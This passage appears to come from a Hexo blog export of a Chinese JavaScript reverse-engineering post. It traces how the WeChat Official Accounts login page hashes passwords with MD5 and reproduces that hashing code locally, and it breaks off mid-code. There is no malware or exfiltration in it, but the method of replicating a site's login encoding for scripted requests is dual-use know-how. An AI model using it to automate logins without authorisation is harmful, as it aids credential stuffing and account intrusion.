unescape(encodeURIComponent(n))\n        }\n        function B(n) {\n            return $(Q(n))\n        }\n        function x(n) {\n            return z(B(n))\n        }\n        function M(n, u) {\n            return q(Q(n), Q(u))\n        }\n        function R(n, u) {\n            return z(M(n, u))\n        }\n        getStr = function(n, u, i) {\n            if (!u) {\n                if (!i) {\n                    return x(n)\n                } else {\n                    return B(n)\n                }\n            }\n            if (!i) {\n                return R(u, n)\n            } else {\n                return M(u, n)\n            }\n        }\n    }\n        .call(T, h, T, I),\n    v !== void 0 && (I.exports = v))\n}()\n\nvar password = \"1234\"\nconsole.log(getStr(password.substr(0, 16)))\n// 81dc9bdb52d04dc20036dbd8313ed055\n```\n","slug":"js逆向","published":1,"updated":"2025-03-11T17:09:18.290Z","comments":1,"layout":"post","photos":[],"_id":"cm8d9pkhk0001lsjf7n5ef0v0","content":"<h3 id=\"微信公众号加密算法分析\"><a href=\"#微信公众号加密算法分析\" class=\"headerlink\" title=\"微信公众号加密算法分析\"></a>微信公众号加密算法分析</h3><p>打开谷歌开发者工具，登录账户密码抓包。</p>\n<figure class=\"highlight yaml\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">username:</span> <span class=\"number\">1234</span></span><br><span class=\"line\"><span class=\"attr\">pwd:</span> <span class=\"string\">81dc9bdb52d04dc20036dbd8313ed055</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>查看调用栈，发现几个和<code>loginpage</code>相关，打上断点。</p>\n<img src=\"/posts/42054/image-20250312004307050.png\" class=\"\" title=\"image-20250312004307050\">\n\n<p>重新登录，开始调试</p>\n<img src=\"/posts/42054/image-20250312005430526.png\" class=\"\" title=\"image-20250312005430526\">\n\n<p>在第一个断点处并未加密，跳到下一个断点</p>\n<img src=\"/posts/42054/image-20250312005550419.png\" class=\"\" title=\"image-20250312005550419\">\n\n<p>这里<code>pwd</code>也还未加密，继续调试</p>\n<img src=\"/posts/42054/image-20250312005630018.png\" class=\"\" title=\"image-20250312005630018\">\n\n<p>仍未加密，跳到<code>p</code>函数处下断点，继续调试</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k.<span class=\"property\">exports</span> = <span class=\"keyword\">function</span>(<span class=\"params\">n, u, i</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!u) {</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!i) {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">x</span>(n)</span><br><span class=\"line\">        } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">B</span>(n)</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!i) {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"title function_\">R</span>(u, n)</span><br><span class=\"line\">    } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"title function_\">M</span>(u, n)</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// x(n)</span></span><br><span class=\"line\"><span class=\"comment\">// '81dc9bdb52d04dc20036dbd8313ed055'</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>那么这里就找到了加密函数位置，将代码复制到本地，改为自执行函数，并将上述函数结果用<code>getStr</code>变量接收。同时不能忘记加上<code>substr()</code>。</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">pwd</span>: <span class=\"title function_\">p</span>(r.<span class=\"property\">pwd</span>.<span class=\"title function_\">substr</span>(<span class=\"number\">0</span>, <span class=\"number\">16</span>))</span><br></pre></td></tr></tbody></table></figure>\n\n<p>那么最终代码如下</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> getStr</span><br><span class=\"line\">!<span class=\"keyword\">function</span>(<span class=\"params\">I, T, h</span>) {</span><br><span class=\"line\">    <span class=\"string\">\"use strict\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> v;</span><br><span class=\"line\">    ;!(v = <span class=\"keyword\">function</span>(<span class=\"params\">m, D, k</span>) {</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">_</span>(<span class=\"params\">n, u</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">var</span> i = (n &amp; <span class=\"number\">65535</span>) + (u &amp; <span class=\"number\">65535</span>)</span><br><span class=\"line\">                , b = (n &gt;&gt; <span class=\"number\">16</span>) + (u &gt;&gt; <span class=\"number\">16</span>) + (i &gt;&gt; <span class=\"number\">16</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> b &lt;&lt; <span class=\"number\">16</span> | i &amp; <span class=\"number\">65535</span></span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">E</span>(<span class=\"params\">n, u</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> n &lt;&lt; u | n &gt;&gt;&gt; <span class=\"number\">32</span> - u</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">w</span>(<span class=\"params\">n, u, i, b, S, j</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">_</span>(<span class=\"title function_\">E</span>(<span class=\"title function_\">_</span>(<span class=\"title function_\">_</span>(u, n), <span class=\"title function_\">_</span>(b, j)), S), i)</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">C</span>(<span class=\"params\">n, u, i, b, S, j, F</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">w</span>(u &amp; i | ~u &amp; b, n, u, S, j, F)</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">d</span>(<span class=\"params\">n, u, i, b, S, j, F</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">w</span>(u &amp; b | i &amp; ~b, n, u, S, j, F)</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">l</span>(<span class=\"params\">n, u, i, b, S, j, F</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">w</span>(u ^ i ^ b, n, u, S, j, F)</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">p</span>(<span class=\"params\">n, u, i, b, S, j, F</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">w</span>(i ^ (u | ~b), n, u, S, j, F)</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">f</span>(<span class=\"params\">n, u</span>) {</span><br><span class=\"line\">            n[u &gt;&gt; <span class=\"number\">5</span>] |= <span class=\"number\">128</span> &lt;&lt; u % <span class=\"number\">32</span>;</span><br><span class=\"line\">            n[(u + <span class=\"number\">64</span> &gt;&gt;&gt; <span class=\"number\">9</span> &lt;&lt; <span class=\"number\">4</span>) + <span class=\"number\">14</span>] = u;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> i, b, S, j, F, s = <span class=\"number\">1732584193</span>, o = -<span class=\"number\">271733879</span>, a = -<span class=\"number\">1732584194</span>, t = <span class=\"number\">271733878</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; n.<span class=\"property\">length</span>; i += <span class=\"number\">16</span>) {</span><br><span class=\"line\">                b = s;</span><br><span class=\"line\">                S = o;</span><br><span class=\"line\">                j = a;</span><br><span class=\"line\">                F = t;</span><br><span class=\"line\">                s = <span class=\"title function_\">C</span>(s, o, a, t, n[i], <span class=\"number\">7</span>, -<span class=\"number\">680876936</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">C</span>(t, s, o, a, n[i + <span class=\"number\">1</span>], <span class=\"number\">12</span>, -<span class=\"number\">389564586</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">C</span>(a, t, s, o, n[i + <span class=\"number\">2</span>], <span class=\"number\">17</span>, <span class=\"number\">606105819</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">C</span>(o, a, t, s, n[i + <span class=\"number\">3</span>], <span class=\"number\">22</span>, -<span class=\"number\">1044525330</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">C</span>(s, o, a, t, n[i + <span class=\"number\">4</span>], <span class=\"number\">7</span>, -<span class=\"number\">176418897</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">C</span>(t, s, o, a, n[i + <span class=\"number\">5</span>], <span class=\"number\">12</span>, <span class=\"number\">1200080426</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">C</span>(a, t, s, o, n[i + <span class=\"number\">6</span>], <span class=\"number\">17</span>, -<span class=\"number\">1473231341</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">C</span>(o, a, t, s, n[i + <span class=\"number\">7</span>], <span class=\"number\">22</span>, -<span class=\"number\">45705983</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">C</span>(s, o, a, t, n[i + <span class=\"number\">8</span>], <span class=\"number\">7</span>, <span class=\"number\">1770035416</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">C</span>(t, s, o, a, n[i + <span class=\"number\">9</span>], <span class=\"number\">12</span>, -<span class=\"number\">1958414417</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">C</span>(a, t, s, o, n[i + <span class=\"number\">10</span>], <span class=\"number\">17</span>, -<span class=\"number\">42063</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">C</span>(o, a, t, s, n[i + <span class=\"number\">11</span>], <span class=\"number\">22</span>, -<span class=\"number\">1990404162</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">C</span>(s, o, a, t, n[i + <span class=\"number\">12</span>], <span class=\"number\">7</span>, <span class=\"number\">1804603682</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">C</span>(t, s, o, a, n[i + <span class=\"number\">13</span>], <span class=\"number\">12</span>, -<span class=\"number\">40341101</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">C</span>(a, t, s, o, n[i + <span class=\"number\">14</span>], <span class=\"number\">17</span>, -<span class=\"number\">1502002290</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">C</span>(o, a, t, s, n[i + <span class=\"number\">15</span>], <span class=\"number\">22</span>, <span class=\"number\">1236535329</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">d</span>(s, o, a, t, n[i + <span class=\"number\">1</span>], <span class=\"number\">5</span>, -<span class=\"number\">165796510</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">d</span>(t, s, o, a, n[i + <span class=\"number\">6</span>], <span class=\"number\">9</span>, -<span class=\"number\">1069501632</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">d</span>(a, t, s, o, n[i + <span class=\"number\">11</span>], <span class=\"number\">14</span>, <span class=\"number\">643717713</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">d</span>(o, a, t, s, n[i], <span class=\"number\">20</span>, -<span class=\"number\">373897302</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">d</span>(s, o, a, t, n[i + <span class=\"number\">5</span>], <span class=\"number\">5</span>, -<span class=\"number\">701558691</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">d</span>(t, s, o, a, n[i + <span class=\"number\">10</span>], <span class=\"number\">9</span>, <span class=\"number\">38016083</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">d</span>(a, t, s, o, n[i + <span class=\"number\">15</span>], <span class=\"number\">14</span>, -<span class=\"number\">660478335</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">d</span>(o, a, t, s, n[i + <span class=\"number\">4</span>], <span class=\"number\">20</span>, -<span class=\"number\">405537848</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">d</span>(s, o, a, t, n[i + <span class=\"number\">9</span>], <span class=\"number\">5</span>, <span class=\"number\">568446438</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">d</span>(t, s, o, a, n[i + <span class=\"number\">14</span>], <span class=\"number\">9</span>, -<span class=\"number\">1019803690</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">d</span>(a, t, s, o, n[i + <span class=\"number\">3</span>], <span class=\"number\">14</span>, -<span class=\"number\">187363961</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">d</span>(o, a, t, s, n[i + <span class=\"number\">8</span>], <span class=\"number\">20</span>, <span class=\"number\">1163531501</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">d</span>(s, o, a, t, n[i + <span class=\"number\">13</span>], <span class=\"number\">5</span>, -<span class=\"number\">1444681467</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">d</span>(t, s, o, a, n[i + <span class=\"number\">2</span>], <span class=\"number\">9</span>, -<span class=\"number\">51403784</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">d</span>(a, t, s, o, n[i + <span class=\"number\">7</span>], <span class=\"number\">14</span>, <span class=\"number\">1735328473</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">d</span>(o, a, t, s, n[i + <span class=\"number\">12</span>], <span class=\"number\">20</span>, -<span class=\"number\">1926607734</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">l</span>(s, o, a, t, n[i + <span class=\"number\">5</span>], <span class=\"number\">4</span>, -<span class=\"number\">378558</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">l</span>(t, s, o, a, n[i + <span class=\"number\">8</span>], <span class=\"number\">11</span>, -<span class=\"number\">2022574463</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">l</span>(a, t, s, o, n[i + <span class=\"number\">11</span>], <span class=\"number\">16</span>, <span class=\"number\">1839030562</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">l</span>(o, a, t, s, n[i + <span class=\"number\">14</span>], <span class=\"number\">23</span>, -<span class=\"number\">35309556</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">l</span>(s, o, a, t, n[i + <span class=\"number\">1</span>], <span class=\"number\">4</span>, -<span class=\"number\">1530992060</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">l</span>(t, s, o, a, n[i + <span class=\"number\">4</span>], <span class=\"number\">11</span>, <span class=\"number\">1272893353</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">l</span>(a, t, s, o, n[i + <span class=\"number\">7</span>], <span class=\"number\">16</span>, -<span class=\"number\">155497632</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">l</span>(o, a, t, s, n[i + <span class=\"number\">10</span>], <span class=\"number\">23</span>, -<span class=\"number\">1094730640</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">l</span>(s, o, a, t, n[i + <span class=\"number\">13</span>], <span class=\"number\">4</span>, <span class=\"number\">681279174</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">l</span>(t, s, o, a, n[i], <span class=\"number\">11</span>, -<span class=\"number\">358537222</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">l</span>(a, t, s, o, n[i + <span class=\"number\">3</span>], <span class=\"number\">16</span>, -<span class=\"number\">722521979</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">l</span>(o, a, t, s, n[i + <span class=\"number\">6</span>], <span class=\"number\">23</span>, <span class=\"number\">76029189</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">l</span>(s, o, a, t, n[i + <span class=\"number\">9</span>], <span class=\"number\">4</span>, -<span class=\"number\">640364487</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">l</span>(t, s, o, a, n[i + <span class=\"number\">12</span>], <span class=\"number\">11</span>, -<span class=\"number\">421815835</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">l</span>(a, t, s, o, n[i + <span class=\"number\">15</span>], <span class=\"number\">16</span>, <span class=\"number\">530742520</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">l</span>(o, a, t, s, n[i + <span class=\"number\">2</span>], <span class=\"number\">23</span>, -<span class=\"number\">995338651</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">p</span>(s, o, a, t, n[i], <span class=\"number\">6</span>, -<span class=\"number\">198630844</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">p</span>(t, s, o, a, n[i + <span class=\"number\">7</span>], <span class=\"number\">10</span>, <span class=\"number\">1126891415</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">p</span>(a, t, s, o, n[i + <span class=\"number\">14</span>], <span class=\"number\">15</span>, -<span class=\"number\">1416354905</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">p</span>(o, a, t, s, n[i + <span class=\"number\">5</span>], <span class=\"number\">21</span>, -<span class=\"number\">57434055</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">p</span>(s, o, a, t, n[i + <span class=\"number\">12</span>], <span class=\"number\">6</span>, <span class=\"number\">1700485571</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">p</span>(t, s, o, a, n[i + <span class=\"number\">3</span>], <span class=\"number\">10</span>, -<span class=\"number\">1894986606</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">p</span>(a, t, s, o, n[i + <span class=\"number\">10</span>], <span class=\"number\">15</span>, -<span class=\"number\">1051523</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">p</span>(o, a, t, s, n[i + <span class=\"number\">1</span>], <span class=\"number\">21</span>, -<span class=\"number\">2054922799</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">p</span>(s, o, a, t, n[i + <span class=\"number\">8</span>], <span class=\"number\">6</span>, <span class=\"number\">1873313359</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">p</span>(t, s, o, a, n[i + <span class=\"number\">15</span>], <span class=\"number\">10</span>, -<span class=\"number\">30611744</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">p</span>(a, t, s, o, n[i + <span class=\"number\">6</span>], <span class=\"number\">15</span>, -<span class=\"number\">1560198380</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">p</span>(o, a, t, s, n[i + <span class=\"number\">13</span>], <span class=\"number\">21</span>, <span class=\"number\">1309151649</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">p</span>(s, o, a, t, n[i + <span class=\"number\">4</span>], <span class=\"number\">6</span>, -<span class=\"number\">145523070</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">p</span>(t, s, o, a, n[i + <span class=\"number\">11</span>], <span class=\"number\">10</span>, -<span class=\"number\">1120210379</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">p</span>(a, t, s, o, n[i + <span class=\"number\">2</span>], <span class=\"number\">15</span>, <span class=\"number\">718787259</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">p</span>(o, a, t, s, n[i + <span class=\"number\">9</span>], <span class=\"number\">21</span>, -<span class=\"number\">343485551</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">_</span>(s, b);</span><br><span class=\"line\">                o = <span class=\"title function_\">_</span>(o, S);</span><br><span class=\"line\">                a = <span class=\"title function_\">_</span>(a, j);</span><br><span class=\"line\">                t = <span class=\"title function_\">_</span>(t, F)</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">return</span> [s, o, a, t]</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">L</span>(<span class=\"params\">n</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">var</span> u, i = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (u = <span class=\"number\">0</span>; u &lt; n.<span class=\"property\">length</span> * <span class=\"number\">32</span>; u += <span class=\"number\">8</span>) {</span><br><span class=\"line\">                i += <span class=\"title class_\">String</span>.<span class=\"title function_\">fromCharCode</span>(n[u &gt;&gt; <span class=\"number\">5</span>] &gt;&gt;&gt; u % <span class=\"number\">32</span> &amp; <span class=\"number\">255</span>)</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">y</span>(<span class=\"params\">n</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">var</span> u, i = [];</span><br><span class=\"line\">            i[(n.<span class=\"property\">length</span> &gt;&gt; <span class=\"number\">2</span>) - <span class=\"number\">1</span>] = <span class=\"keyword\">void</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (u = <span class=\"number\">0</span>; u &lt; i.<span class=\"property\">length</span>; u += <span class=\"number\">1</span>) {</span><br><span class=\"line\">                i[u] = <span class=\"number\">0</span></span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (u = <span class=\"number\">0</span>; u &lt; n.<span class=\"property\">length</span> * <span class=\"number\">8</span>; u += <span class=\"number\">8</span>) {</span><br><span class=\"line\">                i[u &gt;&gt; <span class=\"number\">5</span>] |= (n.<span class=\"title function_\">charCodeAt</span>(u / <span class=\"number\">8</span>) &amp; <span class=\"number\">255</span>) &lt;&lt; u % <span class=\"number\">32</span></span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">$</span>(<span class=\"params\">n</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">L</span>(<span class=\"title function_\">f</span>(<span class=\"title function_\">y</span>(n), n.<span class=\"property\">length</span> * <span class=\"number\">8</span>))</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">q</span>(<span class=\"params\">n, u</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">var</span> i, b = <span class=\"title function_\">y</span>(n), S = [], j = [], F;</span><br><span class=\"line\">            S[<span class=\"number\">15</span>] = j[<span class=\"number\">15</span>] = <span class=\"keyword\">void</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (b.<span class=\"property\">length</span> &gt; <span class=\"number\">16</span>) {</span><br><span class=\"line\">                b = <span class=\"title function_\">f</span>(b, n.<span class=\"property\">length</span> * <span class=\"number\">8</span>)</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">16</span>; i += <span class=\"number\">1</span>) {</span><br><span class=\"line\">                S[i] = b[i] ^ <span class=\"number\">909522486</span>;</span><br><span class=\"line\">                j[i] = b[i] ^ <span class=\"number\">1549556828</span></span><br><span class=\"line\">            }</span><br><span class=\"line\">            F = <span class=\"title function_\">f</span>(S.<span class=\"title function_\">concat</span>(<span class=\"title function_\">y</span>(u)), <span class=\"number\">512</span> + u.<span class=\"property\">length</span> * <span class=\"number\">8</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">L</span>(<span class=\"title function_\">f</span>(j.<span class=\"title function_\">concat</span>(F), <span class=\"number\">512</span> + <span class=\"number\">128</span>))</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">z</span>(<span class=\"params\">n</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">var</span> u = <span class=\"string\">\"0123456789abcdef\"</span>, i = <span class=\"string\">\"\"</span>, b, S;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (S = <span class=\"number\">0</span>; S &lt; n.<span class=\"property\">length</span>; S += <span class=\"number\">1</span>) {</span><br><span class=\"line\">                b = n.<span class=\"title function_\">charCodeAt</span>(S);</span><br><span class=\"line\">                i += u.<span 